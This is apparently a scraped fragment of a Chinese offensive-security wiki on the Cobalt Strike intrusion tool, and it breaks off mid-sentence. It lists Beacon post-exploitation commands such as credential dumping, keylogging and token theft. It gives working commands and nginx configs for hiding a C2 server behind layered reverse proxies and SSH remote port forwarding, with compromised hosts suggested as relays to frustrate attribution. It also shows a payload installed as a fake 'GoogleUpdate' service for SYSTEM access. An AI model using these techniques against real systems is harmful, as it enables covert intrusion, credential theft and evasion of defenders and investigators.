2019-12-29 22:52:56 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"Tools/Cobalt Strike/3.html":{"url":"Tools/Cobalt Strike/3.html","title":"Cobalt Strike Beacon 全部参数","keywords":"","body":"Cobalt Strike 命令详情 beacon> help Beacon Commands =============== Command Description ------- ----------- argue 进程参数欺骗 blockdlls 阻止子进程加载非Microsoft DLL browserpivot 注入受害者浏览器进程 bypassuac 绕过UAC提升权限 cancel 取消正在进行的下载 cd 切换目录 checkin 强制让被控端回连一次 clear 清除beacon内部的任务队列 connect Connect to a Beacon peer over TCP covertvpn 部署Covert VPN客户端 cp 复制文件 dcsync 从DC中提取密码哈希 desktop 远程桌面(VNC) dllinject 反射DLL注入进程 dllload 使用LoadLibrary将DLL加载到进程中 download 下载文件 downloads 列出正在进行的文件下载 drives 列出目标盘符 elevate 使用exp execute 在目标上执行程序(无输出) execute-assembly 在目标上内存中执行本地.NET程序 exit 终止beacon会话 getprivs Enable system privileges on current token getsystem 尝试获取SYSTEM权限 getuid 获取用户ID hashdump 转储密码哈希值 help 帮助 inject 在注入进程生成会话 jobkill 结束一个后台任务 jobs 列出后台任务 kerberos_ccache_use 从ccache文件中导入票据应用于此会话 kerberos_ticket_purge 清除当前会话的票据 kerberos_ticket_use Apply 从ticket文件中导入票据应用于此会话 keylogger 键盘记录 kill 结束进程 link Connect to a Beacon peer over a named pipe logonpasswords 使用mimikatz转储凭据和哈希值 ls 列出文件 make_token 创建令牌以传递凭据 mimikatz 运行mimikatz mkdir 创建一个目录 mode dns 使用DNS A作为通信通道(仅限DNS beacon) mode dns-txt 使用DNS TXT作为通信通道(仅限D beacon) mode dns6 使用DNS AAAA作为通信通道(仅限DNS beacon) mode http 使用HTTP作为通信通道 mv 移动文件 net net命令 note 备注 portscan 进行端口扫描 powerpick 通过Unmanaged PowerShell执行命令 powershell 通过powershell.exe执行命令 powershell-import 导入powershell脚本 ppid Set parent PID for spawned post-ex jobs ps 显示进程列表 psexec Use a service to spawn a session on a host psexec_psh Use PowerShell to spawn a session on a host psinject 在特定进程中执行PowerShell命令 pth 使用Mimikatz进行传递哈希 pwd 当前目录位置 reg Query the registry rev2self 恢复原始令牌 rm 删除文件或文件夹 rportfwd 端口转发 run 在目标上执行程序(返回输出) runas 以其他用户权限执行程序 runasadmin 在高权限下执行程序 runu Execute a program under another PID screenshot 屏幕截图 setenv 设置环境变量 shell 执行cmd命令 shinject 将shellcode注入进程 shspawn 启动一个进程并将shellcode注入其中 sleep 设置睡眠延迟时间 socks 启动SOCKS4代理 socks stop 停止SOCKS4 spawn Spawn a session spawnas Spawn a session as another user spawnto Set executable to spawn processes into spawnu Spawn a session under another PID ssh 使用ssh连接远程主机 ssh-key 使用密钥连接远程主机 steal_token 从进程中窃取令牌 timestomp 将一个文件的时间戳应用到另一个文件 unlink Disconnect from parent Beacon upload 上传文件 wdigest 使用mimikatz转储明文凭据 winrm 使用WinRM横向渗透 wmi 使用WMI横向渗透 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-12-26 23:24:45 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"Tools/Cobalt Strike/34.html":{"url":"Tools/Cobalt Strike/34.html","title":"Cobalt Strike 证书修改","keywords":"","body":"Cobalt Strike 证书修改 0x01. Cobalt Strike 简介&#x10FCA3;&#x10FC80; obalt Strike是一款渗透测试软件，分为客户端与服务端，服务端是一个，客户端可以有多个，可以进行团队分布式操作，Cobalt Strike集成了端口转发、扫描多模式端口Listener、Windows exe程序生成、Windows dll动态链接库生成、java程序生成、office宏代码生成，包括站点克隆获取浏览器的相关信息等。 Cobalt Strike 服务端和客户端是通过 SSL 加密通讯的，由于SSL配置文件和代理配置文件由于默认配置导致keystore文件内容通常被用于防火墙识别。 0x02. 查看与修改 1.keytool工具介绍 Keytool是一个Java数据证书的管理工具,Keytool将密钥（key）和证书（certificates）存在一个称为keystore的文件中,即store后缀文件中。 [>] $ keytool 密钥和证书管理工具 命令: -certreq 生成证书请求 -changealias 更改条目的别名 -delete 删除条目 -exportcert 导出证书 -genkeypair 生成密钥对 -genseckey 生成密钥 -gencert 根据证书请求生成证书 -importcert 导入证书或证书链 -importpass 导入口令 -importkeystore 从其他密钥库导入一个或所有条目 -keypasswd 更改条目的密钥口令 -list 列出密钥库中的条目 -printcert 打印证书内容 -printcertreq 打印证书请求的内容 -printcrl 打印 CRL 文件的内容 -storepasswd 更改密钥库的存储口令 使用 \"keytool -command_name -help\" 获取 command_name 的用法 2.store 文件结构 在keystore里，包含两种数据： 密钥实体（Key entity）—— 密钥（secret key）又或者是私钥和配对公钥（采用非对称加密） 可信任的证书实体（trusted certificate entries）——只包含公钥 。 3.store文件创建 [>] $ keytool -keystore test.store -storepass 123456 -keypass 123456 -genkey -keyalg RSA -alias baidu.com -dname \"CN=(名字与姓氏), OU=(组织单位名称), O=(组织名称), L=(城市或区域名称), ST=(州或省份名称), C=(单位的两字母国家代码)\" 其中 test.store 为新生成的keystore文件，-alias 指定别名，-storepass pass 和 -keypass pass 指定密钥，-keyalg RSA 指定主体公共密钥算法，-dname 指定所有者信息。 4.store文件查看 通过keytool工具进行证书文件查看 keytool -list -v -keystore \"test.store\" 5.store文件修改 修改证书密码 keytool -storepasswd -keystore test.store 执行后会提示输入证书的当前密码，和新密码以及重复新密码确认。 修改keystore的alias（别名） keytool -changealias -keystore test.store -alias source_name -destalias new_name source_name是证书中原来的alias（别名），-destalias指定的是要修改为的alias，这里我们改为new_name。 修改alias（别名）的密码 keytool -keypasswd -keystore test.store -alias source_name source_name是证书中原来的alias（别名），-destalias指定的是要修改为的alias，这里我们改为new_name。 修改alias（别名）的密码 keytool -keypasswd -keystore test.store -alias source_name 执行后会提示输入keystore密码，alias密码，然后提示输入新的alias密码，即完成修改。 6.重新创建 Cobalt Strike 证书文件 查看服务端文件 创建服务端证书文件，请将密码统一 keytool -keystore ./cobaltstrike.store -storepass 123456 -keypass 123456 -genkey -keyalg RSA -alias you_name -dname \"CN=(名字与姓氏), OU=(组织单位名称), O=(组织名称), L=(城市或区域名称), ST=(州或省份名称), C=(单位的两字母国家代码)\" // 后通过如下命令载入 keytool -importkeystore -srckeystore ./cobaltstrike.store -destkeystore ./cobaltstrike.store -deststoretype pkcs12 以上命令请参考服务端启动文件 “teamserver” cobaltstrike.jar 中文件创建 keytool -keystore ./ssl.store -storepass 123456 -keypass 123456 -genkey -keyalg RSA -alias you_name -dname \"CN=051, OU=SSL-RSA, O=Baidu, L=Beijing, ST=Baidu, C=CN\" keytool -keystore ./proxy.store -storepass 123456 -keypass 123456 -genkey -keyalg RSA -alias you_name -dname \"CN=(名字与姓氏), OU=(组织单位名称), O=(组织名称), L=(城市或区域名称), ST=(州或省份名称), C=(单位的两字母国家代码)\" 命令中的别名和所有者信息请自行设定。 参考链接 http://absec.cn/?p=683 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-12-30 10:58:05 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"Tools/Cobalt Strike/14.html":{"url":"Tools/Cobalt Strike/14.html","title":"Cobalt Strike C2 Profile 简介","keywords":"","body":"Cobalt Strike C2 Profile 简介 什么是 C2 通俗称谓, 即 所谓的 命令[command] 和 控制[control]服务器 [C&C 服务器],简称 C2 ,其大致工作原理如下,首先,需要先在本地用对应的 C2 客户端连接到我们的 C2 服务器上,之后,当目标机器一旦正常执行了我们的负载[即 payload],它[负载]便会根据预我们先设置好的延迟,在规定的时间之后回连至 C2 服务器,而我们此时在本地 C2 客户端上看到的直观效果,就是目标机器上线,至于如何去远程操作目标机器就非常简单了,假设我们的负载是 6 秒回连一次,现在我在本地的 C2 客户端执行了一个whoami 的指令,这中间从接收命令到执行命令再到回显结果的过程具体又是怎样的呢 ? 其实也比较简单,当我们在本地 C2 客户端执行了一个 whoami 的指令之后,指令首先会被 C2 客户端发送到 C2 服务器上,当目标机器上的负载下一次回连至 C2 服务器上时,一看原来要执行一个 whoami 命令,负载便会把要执行的命令下载到目标机器上进行执行,随后则会再把执行后的结果回传给 C2 服务器,c2 服务器再把结果传至 C2 客户端,回显到我们的眼前,这便是 C2 最基本的工作原理,为什么一定要说这个呢,因为它对于我们后面去深入理解 CobaltStrike 的工作原理至关重要,可以说也是完全类似的工作模型 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-12-27 21:05:56 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"Tools/Cobalt Strike/15.html":{"url":"Tools/Cobalt Strike/15.html","title":"Cobalt Strike C2 Profile 原理","keywords":"","body":"Cobalt Strike C2 Profile 原理 关于 CobaltStrike 团队服务器工作原理 从上面我们大概了解了下 C2 的基础工作原理,接着,就再来简单看下 CobaltStrike 的工作细节,其实,说白点,上面的通信模型就是 CobaltStrike 的工作原理,只不过,叫法不同,更加细节具体了而已,如下图所示,cobaltstrike 团队服务器会将要执行的任何动作都以计划任务列表的形式进行管理,也就是说,通过 cobaltstrike 客户端发送到团队服务器的任何动作都会被弄成计划任务的形式依次排队[ 这也就是 beacon 内置的那个 job 命令存在的实际意义,后续还会再说明这个东西 ],而后等着目标机器上的负载[payload]来下载这些计划任务列表中的具体指令去目标机器上执行,随后再依次把执行完的结果回传给 cobaltstrike 团队服务器,团队服务器再回显至 CobaltStrike 客户端,大概流程其实就这么简单,自己已是竭尽所能的将这个东西简化的不能再简化了,目的就是为了便于弟兄们能彻底理解,当你真正理解了这些最基础的常识之后,后续对 CobaltStrike 的某些功能的具体实现细节理解的肯定也会更深,实战应用上自然就更加得心应手,ok,废话不多说,我们继续往下看 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-12-27 21:07:29 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"Tools/Cobalt Strike/16.html":{"url":"Tools/Cobalt Strike/16.html","title":"Cobalt Strike C2 Profile 用途","keywords":"","body":"Cobalt Strike C2 Profile 用途 关于 CobaltStrike C2 profile 的实际用途 从上面我们只是简单粗略的了解到 C2 的整个详细通信过程,但对于其内部的流量数据格式,我们暂时还完全未知,比如,你的 C2 是用什么协议传输的,是 http, https, 还是 dns, 或者内网的 smb 协议 等等等...再比如,假设是你是用的 http 进行传输,那么你的 http 请求响应头中的各个字段值又都是怎么设置的呢 ? 能不能实现自定义呢? 再比如,现在默认是每 60 秒才往 C2 服务器发送一次心跳,我现在想更快一点,比如,5 秒就发一次,这个又是在哪里控制的呢? 等等等...诸如此类的,紧接着我们就来简单说下这个东西,其实对于 负载[payload]行为和协议流量特征 方面的的控制全部都可以在 CobaltStrike profile 文件中进行自定义,比如,我想让它[payload]模拟正常的浏览器请求 [ 模拟正常请求进行数据收发的目的,无非就是为了以此种方式来绕过某些简易 ids 的流量审查 ],你就可以把对应浏览器的正常的请求头部的内容全部撸过来放到我们的 profile 的 client 段里,比如,你想伪造哪种 web 服务器响应,就去找那个对应的 web 服务器类型然后把返回的正常的响应头中的数据全部给撸过来放到我们的 profile server 段里,比如,你想让负载每 5 秒就回连一次,也一样可以把它定义到 profile 里...由于本系列为 CobaltStrike 入门阶段学习,此处就不详细的带着弟兄们去了解 profile 语法及实际编写了,其实稍微有点儿基础,看两眼就明白了,我们就直接用别人已经写好的 profile 来看看实际修改后效果 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-12-27 21:08:27 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"Tools/Cobalt Strike/32.html":{"url":"Tools/Cobalt Strike/32.html","title":"尝试将 C2 隐匿于多级 nginx 反向代理","keywords":"","body":"尝试将 C2 隐匿于多级 nginx 反向代理 关于利用多级 nginx 反代实现 beacon 上线的大致思路拓扑 大致思路是这样,首先,我们会用一个 CS 的外部 http 监听器先把流量弹到第一层的 nginx 反代理节点上,因为事先已经在 mail 这台机器上做好了反代配置,而这个反代配置里实际指向的是我们第二层 nginx 反代节点的域名,所以当回连的流量一过来就会直接被抛到第二层的 nginx 反代节点上,由于又事先在第二层反代节点上也做好了反代配置,不过这次配置里指向的并不是别的地方,而是我们真实的 C2 服务器域名,所以最终导致的结果就是,目标机器回连流量在通过众多的 nginx 反代节点之后正常上线,大家自己实际操作过程中,务必要先对着拓扑理解清楚再动手,不然你可能会觉得有些乱,其实,说实话,没啥技术含量,完全都是些基础的堆砌加灵活应用而已,来看实际操作吧 0x01 首先,同时在两台 nginx 反代节点的 vps 机器上编译安装好 nginx,过程非常简单,如下 # apt-get install build-essential libtool libpcre3 libpcre3-dev zlib1g-dev openssl -y # useradd -s /sbin/nologin -M nginx 切记不要以高权限起服务 # wget http://nginx.org/download/nginx-1.14.1.tar.gz # tar xf nginx-1.14.1.tar.gz # cd nginx-1.14.1 # ./configure --prefix=/usr/local/nginx-1.14.1 --user=nginx --group=nginx --with-http_ssl_module --with-http_stub_status_module --with-http_gzip_static_module # make && make install # echo $? 0x02 接着,再回到自己本地的 linux 机器上 启动 CobalStrike 客户端,连到自己的 C2 服务器,然后创建两个 常规 HTTP 协议,端口为 80 [ 注: 两个监听器的协议必须匹配 ] 的监听器,一个就是反向监听器 [ 特别注意下这个反连域名,是真正的 C2 服务器域名,即 oa.finalc2.com,也就是等会儿要从第二层 nginx 反代节点往后抛的域名 ] 另外再创建一个相同协议端口的外部监听器,注意,这个外部监听器的回连域名要写第一层 nginx 反代节点的域名[ 即 mail.first.com ],因为回连的流量会首先被弹到这里,然后再通过层层反代直至抛到后端真实的 C2 服务器,最后,再用这个外部监听器创建一个 exe payload,等会儿要把它丢到目标机器执行 如下,两个监听器准备就绪 0x03 由于此处全程都是用域名在操作,所以务必请提前配置好所有域名解析,只需添加一条对应的 A 记录 即可 mail.first.com 21.67.38.47 host.second.com 187.50.112.135 oa.finalc2.com 208.36.69.66 0x04 开始配置第一层 nginx 反代节点 也就是在 21.67.38.47 这台机器上,配置过程非常简单,如下 # vi /usr/local/nginx/conf/nginx.conf worker_processes 1; events { worker_connections 1024; } http { include mime.types; default_type application/octet-stream; sendfile on; keepalive_timeout 65; log_format main '$remote_addr - $remote_user [$time_local] ' ' \"$request\" $status $body_bytes_sent ' ' \"$http_referer\" \"$http_user_agent\" \"$http_x_forwarded_for\" '; upstream default_pools{ server host.second.com:80; 到达本机的所有 80 端口的流量都会被后抛到这个域名上 } server { listen 80; server_name host.second.com; location / { proxy_pass http://default_pools; } } } 配置完成后,务必要记得立即重启 nginx 服务使配置生效 # ifconfig | grep 'inet addr' # /usr/local/nginx/sbin/nginx -s quit # /usr/local/nginx/sbin/nginx 0x05 开始配置第二层 nginx 反代节点 也就是在 187.50.112.135 这台机器上,过程基本同上,只不过这次是把流量直接抛给了后端的真实 C2 服务器 # vi /usr/local/nginx/conf/nginx.conf worker_processes 1; events { worker_connections 1024; } http { include mime.types; default_type application/octet-stream; sendfile on; keepalive_timeout 65; log_format main '$remote_addr - $remote_user [$time_local] ' ' \"$request\" $status $body_bytes_sent ' ' \"$http_referer\" \"$http_user_agent\" \"$http_x_forwarded_for\" '; upstream default_pools{ server oa.finalc2.com:80; 真实 C2 域名 } server { listen 80; server_name oa.finalc2.com; location / { proxy_pass http://default_pools; } } } 之后,同样务必要记得立即重启 nginx 服务使配置生效 此时,当我们回到目标机器上正常执行 payload 后,便会看到 beacon 正常上线,如下,从目标机器的网络连接中也不难发现,其实,这个连接显示的 ip 也只是我们上面第一层 nginx 反代节点的ip,而真实的 C2 服务器却被隐藏在了后端好几层,再加上如果中间的 nginx 反代节点全部都是直接拿不同国家地域的肉鸡搞的[高度匿名化],这无疑再一次加大了对方的溯源难度和成本 另外,从 CS web log 里我们也清晰的看到,所有请求都是从 187.50.112.135 [即 host.second.com 第二层 nginx 反代节点 ]这台机器过来的,至此,也说明我们的多级反代确实是成功有效的 小结: 至此为止,关于如何利用多级 nginx 反代,来实现 C2 的深度隐藏基本也就说完了,多次实战检验,传输确实挺稳定的,说实话,没太多技术含量,还是那句话,都是些非常简单的基础配合利用,文章初衷也是为了给弟兄们提供一个简单易用的 demo,其实,在实战中,你完全可以把这个搞的非常的复杂,比如,利用一些比较稳定的肉鸡群做成一个非常庞大的全球反代网,这些就要靠弟兄们自己思考了,ok,再多的就不说了,其实话说到这儿,理解的弟兄,应该也都早已经理解了,不过退一步来讲,这样隐藏 C2 其实还是不够彻底,因为,毕竟我们此时的 C2 还是直接被暴露在公网中,既然是在公网,那就肯定有被扫到或者反捅的风险,比如,你的 C2 直接用的 CobaltStrike 这种东西来搞的,万一哪天 CS 再爆洞,你可能又是第一批受害者,所以...弟兄们应该都能理解了,在下个章节中我们将会简单介绍,如何用避免直接把 C2 暴露在公网中的方式去隐藏,并实现本地 beacon 上线,ok,废话不多讲,有任何问题,弟兄们及时反馈,同时也非常欢迎大家来一起深度讨论交流,祝好运 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-12-29 23:02:01 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"Tools/Cobalt Strike/33.html":{"url":"Tools/Cobalt Strike/33.html","title":"尝试将本地 C2 隐匿于 SSH 加密隧道中","keywords":"","body":"尝试将本地 C2 隐匿于 SSH 加密隧道中 0x01 大致思路拓扑说明 思路其实非常简单,首先,先在本地把 CobaltStrike 团队服务器 [ 即 C2 服务器 ] 起起来,然后再拿本地的 CobaltStrike 客户端连上去,接着,便是整个过程最关键的一步,建立 ssh 隧道并执行远程端口转发,谁和谁建呢? 也就是 本地的 linux 和 自己的 vps 建,远程转发的意思其实就是,当公网访问 vps 的某个指定端口时,就直接把这个端口的流量转到我本地机器的某个端口上,假如,本地机器机器的这个端口正好是 比如,CobaltStrike 类似这种监听器的端口,这意味着什么就很都清楚了,也就是所谓的本地 C2 beacon 上线，如果弟兄们真正理解了 ssh 隧道的远程转发,其实这些真的都挺简单的,单单只是作为使用者的我们来讲,完全不存在什么太多的技术含量在里面,ok,废话不多讲,来看实际操作 0x02 首先,到本地 linux 机器上启动 CobaltStrike 团队服务器[ 即 C2 服务器 ] 和 CobaltStrike 客户端,如下 本地启动 CS 团队服务器 # ./teamserver 192.168.3.137 admin 然后启动 CS 客户端连到团队服务器上,并创建一个常规 http 反向监听器,监听 80 端口,注意,反向监听器是直接监听的本地 ip 接着,再创建一个 CS 外部监听器[协议,端口要和上面保持一致],这个外部监听器的主要作用就是把回连的流量先弹到我们公网的 VPS 机器上,因为此处全部是用域名在操作,所以,事先务必先添加一条指向 VPS 的 A 记录,如下 最后,再用上面创建的外部监听生成一个 exe payload 0x03 其次,开始尝试在 本地 linux 和 vps 机器 之间建立 ssh 隧道并执行 远程端口转发, 如下 先开启 vps ssh 转发 # vi /etc/ssh/sshd_config AllowTcpForwarding yes GatewayPorts yes TCPKeepAlive yes PasswordAuthentication yes # systemctl restart sshd.service 重启 ssh 服务 建立隧道并执行远程转发,即把来自外部的 80 端口流量全部转到本地 192.168.3.137 的 80 端口上,而这个端口正好又是上面事先准备好的 CS 的反向监听器端口,后果就是, beacon 直接上线 # ssh -C -f -N -g -R 0.0.0.0:80:192.168.3.137:80 root@mail.first.com -p 22 平时记得养成习惯,远程转发建好以后,就立马就到 vps 上去看看对应端口到底有没有起来,别等了半天,一排查发现,隧道都不通,岂不尴尬,尽量别把时间浪费在这种没必要的地方 0x04 最终,本地 C2 beacon 上线效果 如下,从目标机器的网络连接中,几乎是看不到任何的连接痕迹,暂时已经达到了我们的 \"隐蔽需求\" 从 web log 我们也清晰的看到,走的全部都是本地 ip 小结: 至此为止,关于如何利用 ssh 隧道的远程端口转发来深度隐藏 C2 服务器基本也就说完了,实战证明,这种方式的稳定性暂时还是很不错的,相比之前的 C2 隐藏方式,这种方式的优劣势都非常明显,优势就在于避免直接把自己的 C2 服务器暴露在公网中,而且非常的灵活隐蔽, 灵活在哪儿呢? 一旦发现对方可能在溯源, 我们可以立即切断连接,不过,灵活中劣势也同时被凸显了出来,此方式并不适合拿来做长控,只适合临时渗透阶段用[ 比如,你可以暂时拿这种方式渗透,然后再用其它方式长控 ],隐蔽又在哪儿呢? 此处我只演示了最简单的单层 SSH 隧道,其实,在实战中,你完全可以将 SSH 隧道的 远程 和 本地端口转发 灵活配合起来实现多级的 SSH 隧道级联 隐藏,说到这儿,想必弟兄们都已经都很非常了然了,ok,废话不多讲,有任何问题,弟兄们及时反馈,同时也非常欢迎大家来一起深度讨论交流,祝好运 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-12-29 23:10:59 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"Tools/Cobalt Strike/4.html":{"url":"Tools/Cobalt Strike/4.html","title":"Cobalt Strike 监听器介绍","keywords":"","body":"Cobalt Strike 生成监听器 Listeners简介 在本版本Cobalt Strike 3.14中，提供了如图9种 Listener (监听器)。 windows/beacon_dns/reverse_dns_txt windows/beacon_dns/reverse_http windows/beacon_http/reverse_http windows/beacon_https/reverse_https windows/beacon_smb/bind_pipe windows/beacon_tcp/bind_tcp windows/foreign/reverse_http windows/foreign/reverse_https windows/foreign/reverse_tcp (3.13版后增加，支持linuxSSH会话) beacon_xx 系列为Cobalt Strike自身，包括 dns、http、https、smb 四种方式的监听器。 foreign 系列为外部监听器，通常与MSF或者Armitage联动。 在Cobalt Strike 3.13版本后增加了一个新的 Listeners (windows/beacon_tcp/bind_tcp) ，它支持linuxSSH会话。具体更新内容可以查阅 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-12-27 14:32:48 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"Tools/Cobalt Strike/9.html":{"url":"Tools/Cobalt Strike/9.html","title":"windows/beacon_http/reverse_http [ 基于 http 协议的反向连接 ]","keywords":"","body":"windows/beacon_http/reverse_http [ 基于 http 协议的反向连接 ] 特别说明下,大家大可不必觉得,一听到什么协议就感觉很高精尖一样,其实并不然,所谓基于 http,说通俗点,无非就是把木马回连的流量,严格按照 http 协议的数据格式进行正常封装收发[ 数据交换 ],专业点叫 模拟 http 协议 进行传输,之所以要用 http 协议,无非就是因为它对防火墙的穿透效果相对于其它协议稍好一点 此外,由于我们所使用的是 CobaltStrike 的试用版,所以监听器的创建个数是有限制的,默认同时只能创建一个,不过后期可自行反编译代码,破除这种限制,此处暂时先不多说,来看下具体使用,其实非常简单,直接选中该协议监听器,指定 ip[ 即 vps ip ]端口和监听器名称,点击\"save\" 紧接着,再利用上面监听器生成 payload,注意,此处是直接生成 64 位的 exe payload,实战中的具体位数要根据目标系统的实际位数来确定,当然啦,实战中也不可能就直接这样生成着去用,因为这种方式生成的payload 很显然是不可能免杀的,不过此处仅作为入门学习,暂时大可不必管那么多 之后,将上面生成好的 exe payload 丢到目标机器上去执行,稍等片刻便能看到 beacon shell 被正常弹回,正如我们预期的那样,payload 10 秒发一次心跳数据 要特别注意下的是,CobaltStrike 的 exe payload 默认执行以后在目标系统中就一个进程,一旦对方手动把这个进程给 kill 掉,你的 beacon shell 也就掉了 最后,我们再用 wireshark 来简单看下 reverse_http 监听器的数据收发过程,正如我刚才在上面所说,它就是按照 http 的数据格式来进行数据交换的,当然,此处我们用的仍然是自定义 profile,关于收发过程,其实在之前的文章中也已经看过了,这儿就不多说了,还不了解 http 协议的弟兄,可自行再单独去好好补充下这方面的知识 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-12-27 11:19:21 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"Tools/Cobalt Strike/10.html":{"url":"Tools/Cobalt Strike/10.html","title":"windows/beacon_https/reverse_https [ 基于 https 协议(加密)的反向连接 ]","keywords":"","body":"windows/beacon_https/reverse_https [ 基于 https 协议(加密)的反向连接 ] 首先,依然是创建一个 windows/beacon_https/reverse_https 的监听器,具体如下 接着,再用如上监听器创建 windows 服务 payload 从字面意义上不难理解,所谓 Windows 服务 payload,顾名思义就是以服务的方式启动的 payload,它不同于常规的 exe payload 直接双击即可运行,windows 服务 payload 需要你先用 sc 把它做成系统服务,然后再以服务的方式来启动运行 payload,说白点最终都是在执行某个路径下的 exe,只是调用的方式不通而已,具体操作如下 # sc create GoogleUpdate binpath= \"C:\\Windows\\Help\\Help\\servrcs.exe\" start= auto displayname= \"Plugins Transfer Service\" 创建系统服务 # sc start GoogleUpdate 启动该服务 # sc stop GoogleUpdate 停止该服务 # sc delete GoogleUpdate 删除指定服务,一定要先停止再删除 如下,当我们成功启动服务后,便会看到一个 beacon shell 被正常弹回,特别注意下回来的这个 shell 权限,默认以管理员身份创建启动的服务回来的 shell 一般都直接是 system 权限,这也是有别于常规 exe payload 的地方,执行 exe payload 弹回来的 shell 默认只是当前用户的权限,如果当前用户并不是系统管理员或者是一个未被 BypassUAC 的\"管理员\",那这个 shell 在目标系统中可操作的范围就很窄了,后期还要想办法提权才行 然后我们再来简单看下此时的目标系统进程,发现它是利用 rundll32.exe 来执行我们的服务 payload 的,相对于那种 exe payload 直接一个进程大摇大摆的在目标系统里挂着,这种服务启动的方式就要显的隐蔽多了,当然啦,这也仅仅只是相对隐蔽而已,还是很容易被一步定位到 很明显,由于此处用的是 https 监听器,从 wireshark 中我们发现此时的回传数据已被全部加密,之所以要用 https,是因为这种方式在某些情况下,穿透性要比 http 稍好一些,一定程度上可防止流量被目标的一些防护设备反向解析,其实,说实话,也并好不到哪里去,另外,同样还是那个问题,直接这样生成的服务 payload 也几乎也是不可能免杀的,所以,此处目的也只仅仅只是为了告诉大家,以后可以用这种方式去执行自己的 payload,但 payload 不一定非要这么生成,希望弟兄们能明白我的意思 最后,服务用完以后,记得随手删除 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-12-27 11:26:00 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"Tools/Cobalt Strike/11.html":{"url":"Tools/Cobalt Strike/11.html","title":"windows/foreign/reverse_http [ 反向 http 外部监听器 ]","keywords":"","body":"windows/foreign/reverse_http [ 反向 http 外部监听器 ] 所谓的外部监听器,说白点就是为了更方便的去配合其它的一些渗透工具进行协同渗透而设计的,相信有些朋友可能对 metasploit 或者 empire [ 心里话,个人觉得它很垃圾,也极少用,一般都直接是把里面的powershell 脚本单独抠出来用 ] 比较熟悉,平时可能也比较喜欢拿他们去做些内网渗透工作,那么现在问题来了,比如,我现在通过其它方式已经拿到了目标内网一台机器的 beacon shell,但由于 CobaltStrike自身内置的相关内网渗透功能太少,我还是想用 msf 或者 empire 继续去渗透目标内网,该怎么办呢? 这时候 CobaltStrike 的外部监听器就开始发会作用了,我们可以通过 beacon 内置的派生功能,直接通过 ssh 隧道派生一个 meterpreter 到自己本地的 msf 上,过程非常简单,具体操作如下 首先,我们需要先把本地和自己 vps 的之间的 ssh 隧道打通,因为等会儿要把派生的那个流量通过 ssh 隧道直接转发到我本地,第一步,连到自己的 vps 上,编辑 ssh 服务配置文件开启 ssh 转发功能,之后重启 ssh服务,此处一定要记得重启服务之后它才能生效,如下 # egrep \"AllowTcpForwarding yes|GatewayPorts yes|TCPKeepAlive yes|PasswordAuthentication yes\" /etc/ssh/sshd_config 之后回到本地 linux 机器上,开始尝试和自己的 vps 建立 ssh 隧道,并执行如下转发[-R 即所谓的从远程转发到本地],下面这条 ssh 命令的意思就是通过 207.148.75.85[vps]这台机器把来自外部的 8080 端口的流量都转发我们本地的 192.168.3.57 这个地址的 8081 端口上,这样一来,当别人去连 207.148.75.85 的 8080 端口就相当于直接连到了我本地的 192.168.3.57 这个地址的 8081 端口上,而本地的 192.168.3.57的 8081 端口又正好是我们事先准备好的 msf 监听器,这才直接导致了公网的 meterpreter 也可以直接在本地的 msf 中上线 # ssh -C -f -N -g -R 0.0.0.0:8080:192.168.3.57:8081 root@207.148.75.85 -p 22 # ps -ef | grep \"192.168.3.57\" Ssh 隧道打通以后,可以去 vps 上看下端口到底有没有起来,不要弄了半天不上线,才发现原来端口都没起来,岂不尴尬 # netstat -tulnp 有了 ssh 隧道,剩下的事情就很简单了,新建一个外部监听器,特别注意这个协议和端口,有很多人不上线都是因为这个协议不匹配或者端口弄错了,此处我们用外部监听器中的 reverse_http,端口用 8080,这儿既然用了 http 8080,那么后面的 meterpreter payload 也一定要用 http 和 8080 端口,不然两边端口对不上,协议又不匹配,数据无法实现交换,是不可能上线的,所以,这个地方务必要特别仔细小心 比如,我们现在想通过弹回来的这个 beacon shell,再弹回一个 meterpreter 好去进行内网渗透,就可以利用 beacon 内置的\"spawn\"[派生]功能,将其派生到指定的外部监听器上,刚才忘了说,外部监听器的流量不再是弹到自己的 CobaltStrike 团队服务器上,而是直接弹到指定的远程机器的指定端口上的 这样一来,当我们选择外部监听器进行派生时,流量就会被弹到我们指定的 ip 和端口上,比如,此处是弹到我们 vps 的 8080 端口上,而我们事先又已经通过 ssh 隧道将 vps 的 8080 端口的流量直接转到了我本地的 192.168.3.57 的 8081 端口上,所以最终实现的效果便是来自己公网的 meterpreter 直接在自己本地上线了,不过相比正常弹回的 meterpreter,这样过来的 meterpreter 